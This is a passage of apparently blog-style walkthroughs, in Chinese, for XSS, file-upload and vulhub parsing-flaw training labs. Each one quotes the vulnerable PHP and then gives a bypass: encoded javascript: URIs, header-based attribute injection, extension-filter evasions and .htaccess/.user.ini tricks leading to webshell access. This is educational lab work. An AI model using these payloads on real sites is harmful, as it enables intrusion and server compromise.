\"><scrscriptipt>alert(1);</scrscriptipt>\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191532406.png)\n\n\n# less-08\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level8.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>';\n?>\n<?php\n echo '<center><BR><a href=\"'.$str7.'\">友情链接</a></center>';\n?>\n```\n在上一关的基础上,产生替换并且小写\n\n- payload\n注入点产生在a标签,使用编码绕过\n  ```js\n  javascript:alert(1)\n  unicode编码之后\n  &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191547689.png)\n\n# less-09\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level9.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>';\n?>\n<?php\nif(false===strpos($str7,'http://'))\n{\n  echo '<center><BR><a href=\"您的链接不合法？有没有！\">友情链接</a></center>';\n        }\nelse\n{\n  echo '<center><BR><a href=\"'.$str7.'\">友情链接</a></center>';\n}\n?>\n```\n在上关的基础上校验是否带`http://`,不带则报错\n\n- payload\n依旧使用上关payload,在后面添加http://www.baidu.com,并使用//注释掉\n  ```js\n  &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;//http://www.baidu.com\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191553544.png)\n\n\n# less-10\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str11 = $_GET[\"t_sort\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n<center><img src=level10.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str).\"</h3>\";\n?>\n```\n仅替换`<` `>`,但是输入框被隐藏了,需要修改\n\n- payload\n  ```js\n  \"onmouseover='javascript:alert(1)'\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191618271.png)\n  \n  \n# less-11\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_REFERER'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ref\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n在上一关的基础上增加了一个`$str11=$_SERVER['HTTP_REFERER'];`被写入到第四个输入框也就是`$str33`且不存在过滤\n\n- payload\n  使用post发包,对referer进行修改\n  ```js\n  \"type=\"text\" onmouseover=\"alert(/xss/)\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191626916.png)\n\n# less-12\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_USER_AGENT'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ua\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n`$str11`获取ua字段,并且对`<>`过滤,且隐藏输入框\n\n- payload\n  ```js\n  \"type=\"text\" onmouseover=\"alert(/xss/)\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191631713.png)\n\n\n# less-13\n- 源码\n```php\n<?php \nsetcookie(\"user\", \"call me maybe?\", time()+3600);\nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_COOKIE[\"user\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_cook\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n在上关的基础上,将ua修改为cookie\n\n- payload\n```js\n\"type=\"text\" onmouseover=\"alert(/xss/)\n```\n\n# less-14\n关卡不存在\n\n# less-15\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level5.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n替换<script和on,`.htmlspecialchars($str)`过滤\nng-include 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。\n\n\n- payload\n根据返回的源代码看到存在注入\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191655804.png)\n  ```js\n  ?src='level1.php?name=<img src=1 onerror=alert(/xss/)>'\n  ```\n  \n# less-16\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"&nbsp;\",$str);\n$str3=str_replace(\" \",\"&nbsp;\",$str2);\n$str4=str_replace(\"/\",\"&nbsp;\",$str3);\n$str5=str_replace(\"\t\",\"&nbsp;\",$str4);\necho \"<center>\".$str5.\"</center>\";\n?>\n```\n替换一些符号和script\n\n- payload\n空格被替换为`nbsp;`\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191713039.png)\n  使用%0a绕过\n  ```js\n  <a%0ahref=\"javascr%0aipt:alert(1)\">\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191729841.png)\n\n\n# less-17\n- 源码\n  ```php\n  <?php\n  ini_set(\"display_errors\", 0);\n  echo \"<embed src=xsf01.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n  ?>\n  ```\n\n- payload\n  ```js\n  onmouseover=alert(/XSS/)\n  ```\n  \n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191732101.png)\n\n\n# less-18\n- 源码\n```php\n<?php\nini_set(\"display_errors\", 0);\necho \"<embed src=xsf02.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n?>\n```\n与上关一样\n\n- payload\n  ```js\n  onmouseover=alert(/XSS/)\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191735561.png)\n  \n# less-19-20\n涉及反编译,暂时不会","tags":["xss"],"categories":["靶场"]},{"title":"vulhub靶场","url":"/2022/05/15/vulhub靶场/","content":"# 解析漏洞\n## Apache 换行解析漏洞（CVE-2017-15715）\n上传抓包\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151546551.png)\n\n\n在1.php后面插入一个`\\x0A`（注意，不能是`\\x0D\\x0A`，只能是`一个\\x0A`），不再拦截：\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151628536.png)\n\n访问\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151629134.png)\n\n\n## Apache 多后缀解析漏洞\n\nApache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：\n\n```\nAddType text/html .html\nAddLanguage zh-CN .cn\n```\n其给`.html`后缀增加了`media-type`，值为`text/html`；给`.cn`后缀增加了语言，值为`zh-CN`。此时，如果用户请求文件`index.cn.html`，他将返回一个中文的html页面。\n\n以上就是Apache多后缀的特性。如果运维人员给`.php`后缀增加了处理器：\n\n```\nAddHandler application/x-httpd-php .php\n```\n那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。\n\n上传\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151638905.png)\n\n访问\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151638268.png)\n\n图片被解析为PHP\n\n\n## Nginx 解析漏洞\n该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。\n\n上传图片马,然后添加后缀访问\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151650893.png)\n\n图片被解析成PHP\n\n\n","tags":["漏洞复现"],"categories":["靶场"]},{"title":"upload-labs靶场通关","url":"/2022/05/11/upload-labs靶场通关/","content":"\n\n# pass-01\n- 源码\n```php\nfunction checkFile() {\n    var file = document.getElementsByName('upload_file')[0].value;\n    if (file == null || file == \"\") {\n        alert(\"请选择要上传的文件!\");\n        return false;\n    }\n    //定义允许上传的文件类型\n    var allow_ext = \".jpg|.png|.gif\";\n    //提取上传文件的类型\n    var ext_name = file.substring(file.lastIndexOf(\".\"));\n    //判断上传文件类型是否允许上传\n    if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n        var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n        alert(errMsg);\n        return false;\n    }\n}\n```\n\n- 上传\n    白名单,仅允许上传`.jpg|.png|.gif`,但是只有前端校验\n    上传jpg抓包修改为php\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151356926.png?token=ARYCSATVNRPU6DWWWKPPKE3CQCLEW)\n\n- 连接webshell\n    复制图片地址,使用蚁剑连接\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151356854.png?token=ARYCSAREF6OTJWLDGZ2MYFTCQCLFY)\n\n\n# pass-02\n源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            \n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '文件类型不正确，请重新上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';\n    }\n}\n```\n会对MIME进行验证,与pass-01一样,上传png抓包修改为php\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151357477.png?token=ARYCSARZN7HFRNWW54WT6GLCQCLHU)\n\n\n# pass-03\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if(!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n- 上传\n黑名单,可以上传php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)来绕过\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151358837.png?token=ARYCSASGG5H7RMOU5IWLQVTCQCLKW)\n\n\n# pass-04\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传!';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n- 上传\n黑名单,几乎所有可以上传的文件类型都被写死,但是可以上传`.htaccess`\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205151358987.png?token=ARYCSASLEZWUEELFPZCTEH3CQCLMM)\n```php\n<FilesMatch \"shell.jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n这个文件里面的含义就是将shell.jpg文件解析为php  \n然后直接上传图片马,就可以解析为php\n\n# pass-05\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n- 上传\n禁止了常见后缀名,也包括`.htaccess`,反复观察发现没有被限制的后缀名有 .php7 以及 .ini\nphp.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。\n但是想要引发 .user.ini 解析漏洞需要三个前提条件  \n    1. 服务器脚本语言为PHP\n    2. 服务器使用CGI／FastCGI模式\n    3. 上传目录下要有可执行的php文件\n\n提示\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151401289.png?token=ARYCSAUFA3AA2N463WLCMDDCQCLYM)\n\n上传.user.ini\n```php\nauto_ prepend_ file=shell.jpg\n意思是所有文件都包含shell.jpg   \n``` \n![](https://raw.githubusercontent.com/chencicici/images/main/202205151400641.png?token=ARYCSAWQQMVZ5I6Q4I65BEDCQCLUK)\n\n再上传图片马,蚁剑连接readme.php文件,图片马就被包含进去以php代码执行\n\n\n- 第二种方法绕过\n抓包修改后缀为`shell.php. .` 点空格点\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151402043.png?token=ARYCSAXVVJ6A3HXU4ZPN7OLCQCL3I)\n  蚁剑连接shell.php即可\n  \n# pass-06\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n- 上传\n\n黑名单,但是可以使用大小写绕过\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151402989.png?token=ARYCSAXILS6YHXAJALNEEP3CQCL4S)\n\n\n# pass-07\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = $_FILES['upload_file']['name'];\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file,$img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n- 上传\n黑名单,但是没有去掉空格,使用空格绕过\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151403273.png?token=ARYCSAU4TV7KUZUINL5LNKDCQCL6E)\n\n\n# pass-08\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n- 上传\n黑名单,去空格并且转换为小写,但是忽略了`.`,文件名尾加.绕过\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151403275.png?token=ARYCSAQ4CCYTTO62P7LIVTLCQCL7A)\n  \n# pass-09\n- 源码\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n\n```\n\n- 上传\n在上关的基础上去掉了. 使用特殊字符绕过`::$DATA`\n  php在window的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持\"::$DATA\"之前的文件名 他的目的就是不检查后缀名。\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151403711.png?token=ARYCSAS4OEIOWU727AX56T3CQCMAE)\n  \n\n# pass-10\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n\n```\n\n- 上传\n在上一关的基础上,禁止::$DATA,但是`deldot()`函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来\n   使用pass-05的第二种方法,`. .`绕过\n  \n\n# pass-11\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n- 上传\n删除黑名单中的关键字但是只检测一次,使用双写绕过\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151404428.png?token=ARYCSAUS5VMFYNA5CYFGISDCQCMB2)\n  \n上传之后得到文件名shell.php\n\n# pass-12\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = 